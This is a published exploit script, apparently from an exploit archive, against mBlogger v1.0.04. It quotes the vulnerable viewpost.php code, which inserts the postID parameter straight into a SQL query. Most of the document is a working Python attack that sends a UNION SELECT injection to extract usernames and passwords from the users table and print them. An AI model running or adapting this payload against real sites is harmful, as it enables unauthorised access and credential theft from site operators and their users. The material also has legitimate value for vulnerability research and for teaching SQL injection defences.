mBlogger v1.0.04 (viewpost.php) SQL Injection Exploit
=====================================================

#!/usr/bin/python
#
# Exploit Title:   mBlogger v1.0.04 (viewpost.php) SQL Injection Exploit
# Date         :   31 August 2010
# Author       :   Ptrace Security (Gianni Gnesa [gnix])
# Contact      :   research[at]ptrace-security[dot]com
# Software Link:   http://sourceforge.net/projects/mblogger/
# Version      :   1.0.04
# Tested on    :   EasyPHP 5.3.1.0 for Windows
#
#
# Description
# ===========
#
# + viewpost.php => SQL Injection!!
#
# 30: $query = "SELECT id, name, subject, message, posted FROM posts WHERE
#     id = &#039;$_GET[postID]&#039;";
# 31: $result = mysql_query($query) or die(mysql_error());
# 32: while($row = mysql_fetch_array($result, MYSQL_ASSOC))
# 33: {
# 34:   echo "<div class=&#039;posttitle&#039;>";
# 35:   echo "<h3>" . $row[&#039;subject&#039;] . "</h3>";
# 36:   echo "</div>";
# 37:   echo "<div class=&#039;postbody&#039;>";
# 38:   echo "<p> Posted by: " . $row[&#039;name&#039;] . " on " . $row[&#039;posted&#039;] . "</p>";
# 39:   echo "<p>" . $row[&#039;message&#039;] . "</p>";
# 40:   echo "</div>";
# 41:   $postID = $row[&#039;id&#039;];
# 42: }
#
 
import re
import sys
import http.client
 
 
def usage(prog):
    print(&#039;Usage  : &#039; + prog + &#039; <target> <path>\n&#039;)
    print(&#039;Example: &#039; + prog + &#039; localhost /mBlogger/&#039;)
    print(&#039;         &#039; + prog + &#039; www.target.com /complet/path/&#039;)
    return
 
 
def exploit(target, path):
    payload  = &#039;viewpost.php?postID=-1%27%20UNION%20SELECT%201,%27h4x0r%27,%27&#039;
    payload += &#039;credentials%27,CONCAT(%27%3C1%3E%27,username,%27:%27,password,&#039;
    payload += &#039;%27%3C2%3E%27),%20NULL%20FROM%20users%20--%20%27&#039;
 
    print(&#039;[+] Sending HTTP Request&#039;)
    con = http.client.HTTPConnection(target)
    con.request(&#039;GET&#039;, path + payload)
    res = con.getresponse()
 
    if res.status != 200:
        print(&#039;[!] HTTP GET Request Failed&#039;)
        exit(1)
 
    print(&#039;[+] Parsing HTTP Response&#039;)
    data = res.read().decode()
    pattern = re.compile(r"<1>(.+?)<2>", re.M)
     
    print(&#039;[+] Information Extracted:\n&#039;)
    credentials = pattern.findall(data)
    for element in credentials:
        print(element)
     
    return
 
 
 
print(&#039;\n+-----------------------------------------------------------------------------+&#039;)
print(&#039;| mBlogger v1.0.04 (viewpost.php) SQL Injection Exploit by Ptrace Security    |&#039;)
print(&#039;+-----------------------------------------------------------------------------+\n&#039;)
 
if len(sys.argv) != 3:
    usage(sys.argv[0])
else:
    exploit(sys.argv[1], sys.argv[2])
 
exit(0)



